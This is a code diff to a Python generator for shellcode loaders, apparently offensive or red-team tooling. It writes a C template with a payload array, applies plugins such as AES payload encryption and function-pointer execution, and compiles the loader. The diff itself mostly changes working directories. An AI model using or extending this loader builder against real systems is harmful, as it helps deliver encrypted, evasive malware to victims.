@@ -31,8 +31,8 @@ class Logger:
 # Init logger
 Log = Logger()
 
-def setStatus(id):
-    filename = f'./uploads/{id}/status'
+def setStatus():
+    filename = f'./status'
 
     try:
         with open(filename, 'r') as file:
@@ -45,10 +45,10 @@ def setStatus(id):
         with open(filename, 'w') as file:
             file.write("Working")
 
-def setTemplate(id):
-    os.makedirs(f'./uploads/{id}/src/')
+def setTemplate():
+    os.makedirs(f'./src/')
 
-    filename = f'./uploads/{id}/src/main.c'
+    filename = f'./src/main.c'
 
     template = '''\
 #include <windows.h>
@@ -56,9 +56,8 @@ def setTemplate(id):
 
 {{FUNCTIONS}}
 
-__attribute__((section(".text#"))) \
-const unsigned char shellcode[] = {
-{{SHELLCODE}}
+const unsigned char pPayload[] = {
+	{{PAYLOAD}}
 };
 
 int main() {
@@ -75,8 +74,8 @@ int main() {
     with open(filename, 'w') as file:
         file.write(template)
 
-def setMakefile(id):
-    filename = f'./uploads/{id}/makefile'
+def setMakefile():
+    filename = f'./makefile'
 
     content = '''\
 ProjectName		= result
@@ -103,8 +102,8 @@ x64:
     with open(filename, 'w') as file:
         file.write(content)
 
-def cleanTemplate(id):
-    filename = f'./uploads/{id}/src/main.c'
+def cleanTemplate():
+    filename = f'./src/main.c'
 
     # Open the file in read mode
     with open(filename, 'r') as file:
@@ -113,7 +112,7 @@ def cleanTemplate(id):
     # Clean Template
     content = content.replace('\n{{LIBS}}\n', '')
     content = content.replace('\n{{FUNCTIONS}}', '')
-    content = content.replace('\n{{SHELLCODE}}', '')
+    content = content.replace('\n{{PAYLOAD}}', '')
     content = content.replace('\n{{KEYING}}', '')
     content = content.replace('\n{{PAYLOAD_MODS}}', '')
     content = content.replace('\n{{EXECUTION}}', '')
@@ -122,8 +121,8 @@ def cleanTemplate(id):
     with open(filename, 'w') as file:
         file.write(content)
 
-def cleanMakefile(id):
-    filename = f'./uploads/{id}/makefile'
+def cleanMakefile():
+    filename = f'./makefile'
 
     # Open the file in read mode
     with open(filename, 'r') as file:
@@ -138,14 +137,15 @@ def cleanMakefile(id):
         file.write(content)
 
 def generateLdr(id, plugins):
+    os.chdir(f'./uploads/{id}')
     Log.info(f"[\033[34m{id}\033[0m] Setting working status")
-    setStatus(id)
+    setStatus()
 
     Log.info(f"[\033[34m{id}\033[0m] Setting makefile")
-    setMakefile(id)
+    setMakefile()
 
     Log.info(f"[\033[34m{id}\033[0m] Setting template")
-    setTemplate(id)
+    setTemplate()
 
     Log.info(f"[\033[34m{id}\033[0m] Running plugins")
 
@@ -180,36 +180,36 @@ def generateLdr(id, plugins):
         importlib.import_module(plugPath).run()
 
     Log.info(f"[\033[34m{id}\033[0m] Cleaning up makefile")
-    cleanMakefile(id)
+    cleanMakefile()
 
     Log.info(f"[\033[34m{id}\033[0m] Cleaning up template")
-    cleanTemplate(id)
+    cleanTemplate()
 
     Log.info(f"[\033[34m{id}\033[0m] Compiling loader")
-    os.chdir(f'./uploads/{id}')
     make_process = subprocess.Popen("make", stderr=subprocess.STDOUT)
     if make_process.wait() != 0:
         Log.error(f"[\033[34m{id}\033[0m] Error when compiling")
-    os.chdir(f'./../..')
     Log.info(f"[\033[34m{id}\033[0m] Compiling completed")
     
     Log.info(f"[\033[34m{id}\033[0m] Work done, updating status")
-    setStatus(id) 
+    setStatus() 
+
+    os.chdir(f'./../..')
 
 if __name__ == "__main__":
     id = "dahhfdgsfjhagfdjgawhriweancvbasdf"
-
     os.makedirs(f'./uploads/{id}')
+    shutil.copy('payload.bin', f'./uploads/{id}/payload.bin')
 
     plugins = {
                 "execution": [
-                    
+                    "/execution/local/FPointer"
                 ],
                 "keying": [
                     
                 ],
                 "payload_mods": [
-                    
+                    "/payload_mods/encryption/CTAES"
                 ],
                 "post_comp": [
                     
@@ -223,4 +223,4 @@ if __name__ == "__main__":
 
     # Remove directory
     Log.info(f"[\033[34m{id}\033[0m] Removing temp dir")
-    shutil.rmtree(f'./uploads/{id}')
+    #shutil.rmtree(f'./uploads/{id}')
